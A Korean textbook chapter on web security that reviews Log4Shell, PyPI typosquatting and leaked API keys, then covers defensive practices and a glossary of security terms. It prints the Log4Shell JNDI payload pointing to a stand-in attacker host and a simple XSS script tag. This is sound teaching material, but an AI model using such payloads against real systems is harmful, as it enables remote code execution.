# Ch.23 유사 사례와 키워드 정리

[< 웹 보안의 핵심](./02-web-security.md)

---

이번 챕터에서는 XSS, SQL Injection, CSRF가 왜 발생하는지, CORS와 TLS가 무엇을 보호하는지, Session과 JWT의 차이, 비밀번호 해싱과 Rate Limiting을 확인했다.

같은 원리가 적용되는 실무 사례를 몇 가지 더 본다.


## 23-5. 유사 사례

### Log4Shell (CVE-2021-44228)

2021년 12월, Java 로깅 라이브러리 Log4j에서 치명적 취약점이 발견됐다. 공격자가 로그에 특정 문자열을 포함시키면, 서버가 외부 서버에서 코드를 다운로드해서 실행하는 원격 코드 실행(RCE) 취약점이었다.

```
${jndi:ldap://attacker.com/exploit}
```

이 문자열이 로그에 기록되는 순간, Log4j가 JNDI Lookup을 수행하면서 공격자의 서버에서 악성 코드를 가져와 실행한다. HTTP 요청의 User-Agent, 검색어, 이메일 주소 등 "로그에 기록될 수 있는 모든 곳"이 공격 벡터였다.

CVSS 점수 10.0(최고 위험). Minecraft 서버부터 Apple iCloud, Amazon, Twitter까지 영향을 받았다. 2021년 가장 심각한 보안 사건 중 하나였다.

(출처: NIST National Vulnerability Database, CVE-2021-44228)

(Python 사용자라면 직접적인 영향은 없었다. Log4j는 Java 라이브러리니까. 하지만 "로그에 기록되는 입력도 공격 벡터가 될 수 있다"는 교훈은 언어를 가리지 않는다. Python에서도 `logging.info(f"User input: {user_input}")`처럼 사용자 입력을 로그에 넣을 때, 그 입력이 어디서 해석될 수 있는지를 항상 생각해야 한다.)

### 의존성 취약점 (Supply Chain Attack)

코드 자체에 취약점이 없어도, 사용하는 라이브러리에 취약점이 있으면 뚫린다.

2021년, Python 패키지 저장소(PyPI)에 인기 패키지와 이름이 비슷한 악성 패키지가 올라왔다. `python-dateutil` 대신 `python-deteutil`(오타). 설치하면 시스템 정보를 외부로 전송하는 코드가 실행됐다. 이런 공격을 Typosquatting이라고 한다.

(출처: Snyk Blog, "Typosquatting on PyPI", 2021)

`pip install` 할 때 패키지 이름을 한 번 더 확인하는 습관이 필요하다. 그리고 의존성의 알려진 취약점을 정기적으로 스캔해야 한다. GitHub의 Dependabot, `pip-audit`, Snyk 같은 도구가 이 역할을 한다.

```bash
# pip-audit으로 현재 환경의 알려진 취약점을 스캔
pip install pip-audit
pip-audit
```

### API Key를 GitHub에 올렸다

가장 흔하고, 가장 피해가 큰 실수 중 하나다. AWS Access Key, DB 비밀번호, API 토큰 같은 민감 정보를 코드에 하드코딩하고 GitHub에 push한다.

```python
# 이런 코드가 public repository에 올라간다
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
```

GitHub에는 이런 키를 자동으로 스캔하는 봇이 돌고 있다. public repository에 AWS 키를 올리면, 평균 수 분 이내에 누군가 해당 키로 EC2 인스턴스를 수백 개 띄워서 암호화폐 채굴을 시작한다. 다음 달 AWS 청구서에 수천만원이 찍힌다.

방어:

1. 민감 정보는 환경 변수나 시크릿 관리 도구(AWS Secrets Manager, Vault)로 관리한다
2. `.gitignore`에 `.env`, `credentials.json` 같은 파일을 추가한다
3. GitHub의 Secret Scanning 기능을 활성화한다
4. pre-commit hook으로 커밋 전에 민감 정보를 검사한다

```bash
# .gitignore 예시
.env
*.pem
credentials.json
```

```python
# 환경 변수에서 읽어온다
import os
AWS_ACCESS_KEY = os.environ["AWS_ACCESS_KEY"]
```


## 그래서 실무에서는 어떻게 하는가

### 1. Input Validation 체크리스트

사용자 입력이 들어오는 모든 곳에서 검증한다:

```python
from pydantic import BaseModel, Field, field_validator
import re

class CreatePostRequest(BaseModel):
    title: str = Field(max_length=200)
    content: str = Field(max_length=10000)

    @field_validator("title")
    @classmethod
    def validate_title(cls, v):
        # HTML 태그 포함 여부 검사
        if re.search(r"<[^>]+>", v):
            raise ValueError("HTML 태그는 허용되지 않는다")
        return v.strip()
```

Pydantic의 `BaseModel`로 타입, 길이, 형식을 선언적으로 검증한다. FastAPI와 조합하면 요청 단계에서 잘못된 입력을 걸러낸다.

### 2. 보안 헤더 설정

```python
from fastapi.middleware.trustedhost import TrustedHostMiddleware
from starlette.middleware import Middleware

# 허용된 Host만 접근 가능
app.add_middleware(TrustedHostMiddleware, allowed_hosts=["example.com", "*.example.com"])

# 응답에 보안 헤더 추가
@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    # XSS 방어: 브라우저의 인라인 스크립트 실행을 차단
    response.headers["Content-Security-Policy"] = "default-src 'self'"
    # Clickjacking 방어: iframe 삽입 차단
    response.headers["X-Frame-Options"] = "DENY"
    # MIME 타입 스니핑 차단
    response.headers["X-Content-Type-Options"] = "nosniff"
    # HTTPS 강제
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    return response
```

`Content-Security-Policy`(CSP)는 XSS의 강력한 방어 수단이다. `default-src 'self'`는 "같은 Origin의 리소스만 로드하라"는 뜻이다. 인라인 스크립트(`<script>alert(1)</script>`)와 외부 스크립트 로드를 차단한다. Escape를 깜빡해도 CSP가 2차 방어선이 된다.

### 3. 의존성 업데이트

```bash
# 현재 환경의 취약점 스캔
pip-audit

# Poetry 환경에서 패키지 업데이트
poetry update

# GitHub Dependabot 설정 (.github/dependabot.yml)
```

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
```

Dependabot이 매주 취약점이 있는 의존성을 확인하고, 업데이트 PR을 자동으로 만들어준다.

### 4. 쿠키 보안 속성

```python
response.set_cookie(
    key="session_id",
    value=session_id,
    httponly=True,     # JavaScript에서 접근 불가 (XSS 방어)
    secure=True,       # HTTPS에서만 전송
    samesite="lax",    # 다른 사이트에서의 요청에 쿠키 미포함 (CSRF 방어)
    max_age=3600,      # 1시간 후 만료
)
```

- `httponly=True`: `document.cookie`로 접근할 수 없다. XSS로 쿠키를 탈취할 수 없게 만든다.
- `secure=True`: HTTPS 연결에서만 쿠키가 전송된다.
- `samesite="lax"`: 다른 사이트에서 링크를 클릭해서 오는 GET 요청에는 쿠키가 포함되지만, POST 요청(폼 제출 등)에는 포함되지 않는다. `"strict"`로 설정하면 모든 크로스 사이트 요청에서 쿠키를 차단한다.


## 3. 오늘 키워드 정리

보안은 하나의 키워드가 아니라, 여러 계층의 키워드가 조합되어 동작한다. 이번 챕터에서 나온 키워드를 정리한다.

<details>
<summary>OWASP Top 10</summary>

OWASP가 발표하는 웹 애플리케이션 보안 위협 상위 10개 목록이다. 2~3년 주기로 갱신된다. 2021년 기준 1위는 Broken Access Control, 3위는 Injection(SQL Injection, XSS 포함)이다. 웹 보안의 기본 교과서라고 보면 된다.

출처: OWASP Foundation, https://owasp.org/Top10/

</details>

<details>
<summary>XSS (Cross-Site Scripting)</summary>

악성 스크립트를 웹 페이지에 주입해서 다른 사용자의 브라우저에서 실행시키는 공격이다. Stored XSS(DB 저장), Reflected XSS(URL 파라미터), DOM-based XSS(클라이언트) 세 유형이 있다. 방어: HTML Escape, Content-Security-Policy 헤더, HttpOnly 쿠키.

</details>

<details>
<summary>SQL Injection</summary>

사용자 입력을 SQL 쿼리에 직접 삽입할 때, 공격자가 SQL 구문을 포함시켜 원래 쿼리의 의미를 바꾸는 공격이다. 데이터 유출, 변조, 삭제가 가능하다. 방어: Parameterized Query, ORM 사용. f-string이나 문자열 연결로 SQL을 절대 만들면 안 된다.

</details>

<details>
<summary>CSRF (Cross-Site Request Forgery)</summary>

인증된 사용자가 의도하지 않은 요청을 위조하는 공격이다. 사용자의 인증 정보(쿠키)가 자동 전송되는 것을 악용한다. 방어: CSRF Token, SameSite 쿠키, Referer/Origin 헤더 검증.

</details>

<details>
<summary>Same-Origin Policy (동일 출처 정책)</summary>

브라우저가 "같은 Origin(프로토콜 + 도메인 + 포트)에서 온 리소스만 접근 가능하다"고 제한하는 보안 정책이다. 악성 사이트가 다른 사이트의 API를 호출하는 것을 막는 기본 방어선이다.

</details>

<details>
<summary>CORS (Cross-Origin Resource Sharing)</summary>

Same-Origin Policy를 선택적으로 완화하는 HTTP 메커니즘이다. 서버가 `Access-Control-Allow-Origin` 헤더로 "이 Origin의 요청은 허용한다"고 선언한다. 브라우저의 정책이므로, 서버 간 통신에는 적용되지 않는다.

</details>

<details>
<summary>HTTPS / TLS (Transport Layer Security)</summary>

통신 암호화 프로토콜이다. HTTP + TLS = HTTPS. 기밀성(도청 불가), 무결성(변조 감지), 인증(서버 인증서 검증)을 보장한다. Ch.6의 TCP 위에서 동작한다. TLS 1.3이 최신 버전이다.

</details>

<details>
<summary>대칭키 / 비대칭키 암호화</summary>

대칭키: 같은 키로 암호화/복호화. 빠르지만 키 교환 문제가 있다 (AES).
비대칭키: 공개키/개인키 쌍. 느리지만 키 교환이 안전하다 (RSA, ECDHE).
TLS는 비대칭키로 세션 키를 교환하고, 이후 대칭키로 통신한다.

</details>

<details>
<summary>JWT (JSON Web Token)</summary>

서버가 발급하는 서명된 토큰이다. Header.Payload.Signature 구조. 서버에 상태를 저장하지 않아도 된다(Stateless). 하지만 토큰 탈취 시 만료까지 무효화가 어렵다. Payload는 Base64 인코딩이므로 민감 정보를 넣으면 안 된다.

</details>

<details>
<summary>Session (세션)</summary>

서버에 사용자 상태를 저장하는 인증 방식이다. 세션 ID를 쿠키로 전송하고, 서버가 세션 저장소(메모리, Redis)에서 사용자 정보를 조회한다. 강제 로그아웃이 가능하지만, 서버가 여러 대면 세션 공유가 필요하다(Stateful).

</details>

<details>
<summary>bcrypt / Password Hashing</summary>

비밀번호를 안전하게 저장하기 위한 느린 해시 함수다. SHA-256 같은 범용 해시와 달리, 의도적으로 연산을 느리게 만들어서 무차별 대입 공격을 비실용적으로 만든다. Salt를 자동으로 포함해서 Rainbow Table 공격도 방어한다.

</details>

<details>
<summary>Rate Limiting</summary>

일정 시간 내 요청 횟수를 제한하는 기법이다. Brute Force(무차별 대입) 공격을 방어한다. nginx, API Gateway, 또는 애플리케이션 레벨에서 구현 가능하다. Redis의 INCR + EXPIRE 조합으로 분산 환경에서도 구현할 수 있다.

</details>

<details>
<summary>CSP (Content-Security-Policy)</summary>

브라우저에게 "어떤 리소스를 로드할 수 있는지"를 지시하는 HTTP 헤더다. 인라인 스크립트 실행을 차단하면 XSS를 근본적으로 막을 수 있다. HTML Escape를 놓쳤을 때의 2차 방어선이다.

</details>


### 재등장 키워드

| 키워드 | 최초 등장 | 이번 챕터에서의 역할 |
|--------|----------|-------------------|
| TCP | Ch.6 | TLS가 TCP 위에서 동작한다. HTTPS = TCP + TLS + HTTP |
| Connection Pool | Ch.6 | Rate Limiting을 Redis Connection Pool로 구현할 수 있다 |
| Atomicity | Ch.5 | CSRF Token 검증은 "확인 + 실행"이 원자적이어야 한다 |
| Redis | Ch.17 | 세션 저장소, Rate Limiting 카운터로 사용 |
| Hash Function | Ch.10 | bcrypt도 Hash 기반. Ch.10의 Hash Table과 같은 수학적 기반 |
| Code Review | Ch.9 | 보안 취약점은 코드 리뷰에서 잡아야 한다 |


### 키워드 연관 관계

```mermaid
graph LR
    OWASP["OWASP Top 10"] --> XSS
    OWASP --> SQLI["SQL Injection"]
    OWASP --> CSRF

    XSS -->|"방어"| ESC["HTML Escape"]
    XSS -->|"방어"| CSP["CSP"]
    SQLI -->|"방어"| PQ["Parameterized Query"]
    CSRF -->|"방어"| CT["CSRF Token"]
    CSRF -->|"방어"| SS["SameSite Cookie"]

    SOP["Same-Origin Policy"] -->|"완화"| CORS
    SOP -->|"방어"| CSRF

    TLS["HTTPS / TLS"] --> TCP["TCP<br/>(Ch.6)"]
    TLS --> SYM["대칭키"]
    TLS --> ASYM["비대칭키"]

    JWT -->|"vs"| SESSION["Session"]
    SESSION --> REDIS["Redis<br/>(Ch.17)"]
    JWT -->|"Stateless"| MSA["MSA"]

    PW["Password Hashing"] --> BCRYPT["bcrypt"]
    PW --> HF["Hash Function<br/>(Ch.10)"]
    RL["Rate Limiting"] --> REDIS

    style XSS fill:#f96,stroke:#333
    style SQLI fill:#f96,stroke:#333
    style CSRF fill:#f96,stroke:#333
```


## 다음에 이어지는 이야기

이번 챕터에서는 웹 보안의 기초를 다뤘다. 사용자 입력을 신뢰하지 않는 것, 통신을 암호화하는 것, 인증을 안전하게 처리하는 것. Part 7의 보안 챕터가 끝났다.

Ch.1에서 "CS 키워드를 모르면 검색도 AI도 못 쓴다"로 시작해서, 23챕터에 걸쳐 OS, 네트워크, 자료구조, 알고리즘, DB, 캐시, 아키텍처, 테스트, 분산 시스템, 보안을 하나씩 쌓아왔다. 이 키워드들은 각각 따로 노는 게 아니다. System Call을 알아야 print가 왜 느린지 알고, TCP를 알아야 Connection Pool이 왜 필요한지 알고, Hash를 알아야 인덱스도 비밀번호 해싱도 이해할 수 있다.

다음 챕터에서는 이 모든 것을 하나로 연결한다. 하나의 서비스를 설계에서 배포까지 분석하면서, 24챕터의 키워드가 각 레이어에서 어떻게 작동하는지를 전체 그림으로 완성한다.

---

[< 웹 보안의 핵심](./02-web-security.md)

[< Ch.22 분산 시스템의 기초](../ch22/README.md) | [Ch.24 종합 >](../ch24/README.md)
